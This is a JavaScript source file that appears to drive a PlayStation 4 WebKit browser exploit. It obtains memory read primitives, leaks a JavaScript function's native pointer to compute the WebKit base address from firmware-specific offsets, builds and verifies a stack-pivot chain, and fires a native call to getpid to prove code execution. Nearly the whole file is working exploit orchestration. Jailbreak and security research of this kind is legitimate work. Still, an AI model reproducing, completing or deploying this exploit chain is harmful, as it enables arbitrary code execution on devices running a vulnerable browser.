/**
 * Minimal PS4 native pivot — smallest heap footprint for 13.52 expm1 OOM work.
 */
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { establishPrimitive, trimExploitDebris } from "./core.js";
import {
    prepNativeChain, layoutSmokeStack, fireNativeCall, firePivotSmoke,
    stageGetpid, resolvePivotBuiltin, firePivotTrigger,
    verifySlabContent, verifyBisectChainSet,
} from "./native_call.js";
import {
    resolveG0GetpidStubOff, getpidRetOk,
} from "./stub_g0_fire.js?v=stub-g0-10";

const BUILD = "native-lite-1";
const params = new URLSearchParams(location.search);

let lines = [];
let ready = false;
let busy = false;
let prep = null;
const retain = [];

function $(id) { return document.getElementById(id); }

function log(tag, detail) {
    const line = tag + (detail ? "  " + detail : "");
    lines.push(line);
    if (lines.length > 80) lines.shift();
    try {
        const prev = sessionStorage.getItem("wk-native-log") || "";
        sessionStorage.setItem("wk-native-log", (prev ? prev + "\n" : "") + line);
    } catch (_) { }
    const o = $("out");
    if (o) { o.textContent = lines.join("\n"); o.scrollTop = o.scrollHeight; }
}

function state(msg, cls) {
    const s = $("state");
    if (s) { s.textContent = msg; s.className = cls || ""; }
}

function parseAddr(raw) {
    if (!raw) return null;
    if (typeof raw === "object" && raw != null && "low" in raw)
        return new int64(raw.low >>> 0, raw.hi >>> 0);
    let s = String(raw).replace(/^0x/i, "").trim();
    if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
    if (s.length < 16) s = s.padStart(16, "0");
    return new int64(parseInt(s.slice(-8), 16) >>> 0, parseInt(s.slice(0, -8), 16) >>> 0);
}

function lkFromFn(raw) {
    const p = parseAddr(raw);
    if (!p) return null;
    if ((p.low & 0x3fff) === 0 && p.hi >= 0x80 && p.hi <= 0x8f) return p;
    const lk = p.sub32(0x13b20);
    if (lk.hi >= 0x80 && lk.hi <= 0x8f && (lk.low & 0x3fff) === 0) return lk;
    return p;
}

function captureMainMf(p, off, pivotFn) {
    const mOff = off.wk_JSFunction_m_function || 0x28;
    const cell = p.leakval(pivotFn);
    const jfn = p.read8(cell.add32(0x18));
    const mainMf = jfn.add32(mOff);
    const mainOrig = p.read8(mainMf);
    return { cell, jfn, mainMf, mainOrig, nativeFn: mainOrig };
}

function finishPivot(p, carrier) {
    const mode = params.get("pivot") || "empty";
    let obj = {};
    if (mode === "ta" && carrier && carrier.textarea) obj = carrier.textarea;
    prep.pivotObj = obj;
    prep.pivotCell = p.leakval(obj);
    prep.keepAlive.push(obj);
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    state("primitive…", "warn");
    const pivot = resolvePivotBuiltin(params.get("pivotfn") || "parseInt");
    log("BOOT", BUILD + " pivotfn=" + pivot.name + " pivot=" + (params.get("pivot") || "empty"));
    try {
        const carrier = await establishPrimitive({
            maxAttempts: 0,
            skipTrimDebris: true,
            onEvent: (t, d) => { if (/FAIL|ERROR|PRIMITIVE|ATTEMPT/i.test(t)) log(t, d || ""); },
        });
        installWindowP(carrier, { promote: false });
        window._wkCarrier = carrier;
        const p = window.p;
        if (!p) throw new Error("no window.p");
        try { trimExploitDebris(); log("TRIM", "ok"); } catch (_) { }
        if (pairStatus.state === "broken") throw new Error("pair broken");

        const off = offsetsFor(navigator.userAgent).off;
        if (!off) throw new Error("unknown FW");
        const cap = captureMainMf(p, off, pivot.fn);
        cap.pivotTrigger = pivot.fn;
        cap.pivotBuiltinName = pivot.name;
        const webkitBase = cap.nativeFn.sub32(off.wk_expm1_builtin);
        prep = prepNativeChain(p, off, webkitBase, cap);
        finishPivot(p, carrier);
        for (let i = 0; i < prep.keepAlive.length; i++) retain.push(prep.keepAlive[i]);
        if (carrier.textarea) retain.push(carrier.textarea);

        const v = verifyBisectChainSet(a => p.read1(a), webkitBase, off);
        log("PIVOT", v.ok ? "chain OK" : "chain BAD " + (v.pivot.bad.join(",") || v.popBad.join(",")));

        ready = true;
        log("PRIMITIVE-OK", "prep S=" + prep.M.S + " fn=" + pivot.name);
        state("OK — smoke or Accept fn → getpid", "ok");
        $("btn-smoke").disabled = false;
        $("btn-accept").disabled = false;
    } catch (e) {
        log("FAIL", e.message || String(e));
        state("failed", "bad");
    } finally {
        busy = false;
    }
}

function runSmoke() {
    if (busy || !ready || !prep) return;
    busy = true;
    log("SMOKE", "layout + " + (prep.pivotBuiltinName || "?"));
    try {
        const off = offsetsFor(navigator.userAgent).off;
        layoutSmokeStack(prep);
        const c = verifySlabContent(window.p, prep);
        if (!c.ok) log("SLAB-WARN", c.reasons.join("; "));
        firePivotSmoke(window.p, prep, off, { hook: "cell30", carrier: window._wkCarrier });
        log("SMOKE-OK", "survived");
        state("smoke OK", "ok");
    } catch (e) {
        log("SMOKE-FAIL", e.message || String(e));
        state("smoke OOM?", "bad");
    } finally {
        busy = false;
    }
}

function runGetpid() {
    if (busy || !ready || !prep) return;
    const raw = $("fn-in").value.trim() || sessionStorage.getItem("wk-lastFnPtr") || "";
    const lk = lkFromFn(raw);
    if (!lk) {
        log("SKIP", "paste k_usleep fn");
        return;
    }
    busy = true;
    log("GETPID", "lk=" + lk);
    try {
        const p = window.p;
        const off = offsetsFor(navigator.userAgent).off;
        const stub = resolveG0GetpidStubOff(p, lk, off, {
            getpidMode: params.get("getpid") || "auto",
        });
        log("GETPID-STUB", stub.tag);
        stageGetpid(p, prep, lk, off, stub.stubOff, { hook: "cell30", carrier: window._wkCarrier });
        const ret = fireNativeCall(p, prep, off, { hook: "cell30", carrier: window._wkCarrier });
        const ok = getpidRetOk(ret, stub.mode);
        log("DONE", stub.mode === "raw" ? "pid=" + ret : "wrap-ret=" + ret);
        state(ok
            ? (stub.mode === "raw" ? "getpid pid=" + ret : "getpid wrap OK")
            : "getpid ret=" + ret, ok ? "ok" : "warn");
    } catch (e) {
        log("FAIL", e.message || String(e));
        state("fire failed", "bad");
    } finally {
        busy = false;
    }
}

function runAccept() {
    const raw = $("fn-in").value.trim();
    if (!raw) return;
    try { sessionStorage.setItem("wk-lastFnPtr", raw); } catch (_) { }
    log("ACCEPT", raw.slice(0, 40));
    runGetpid();
}

function init() {
    try {
        const prev = sessionStorage.getItem("wk-native-log");
        if (prev) lines = prev.split("\n").slice(-60);
    } catch (_) { }
    $("out").textContent = lines.join("\n");
    $("btn-start").addEventListener("click", runStart);
    $("btn-smoke").addEventListener("click", runSmoke);
    $("btn-getpid").addEventListener("click", runGetpid);
    $("btn-accept").addEventListener("click", runAccept);
    $("btn-getpid").disabled = true;
    const saved = sessionStorage.getItem("wk-lastFnPtr");
    if (saved) $("fn-in").value = saved;
}

init();
